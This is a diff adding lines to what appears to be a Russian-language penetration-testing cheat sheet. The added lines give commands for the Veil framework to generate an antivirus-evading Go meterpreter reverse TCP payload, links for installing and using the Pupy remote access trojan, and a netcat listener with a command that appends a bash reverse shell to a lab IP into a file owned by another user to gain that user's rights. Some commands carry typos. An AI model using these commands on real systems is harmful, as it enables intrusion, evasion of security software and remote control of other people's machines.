@@ -1589,3 +1589,27 @@ msf5> exploit
 
 
 
+Фреймворк для маскировки эксплойтов Veil
+$ sudo apt insall veil
+$ veil
+Veil>: use Evasion
+Veil>: use go.meterpreter/rev_tcp.py
+[go/meterpreter/rev_tcp>>]: set RHOST 10.0.0.1
+[go/meterpreter/rev_tcp>>]: set RPORT 4444
+[go/meterpreter/rev_tcp>>]: generateche	
+
+
+
+Установка и использование Pupy RAT (Remote Admin Tool)
+https://github.com/n1nj4sec/pupy/wiki/Installation
+https://github.com/n1nj4sec/pupy/wiki/Basic-Usage
+
+
+
+
+
+Extra
+
+NetCat Reverse Shell с правами другого пользователя, если мы имеем возможность запсывать в файл, прнадлежащй ему
+nc -nvlp 61337
+echo  "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.52/61337 0>&1' #" >> hackers
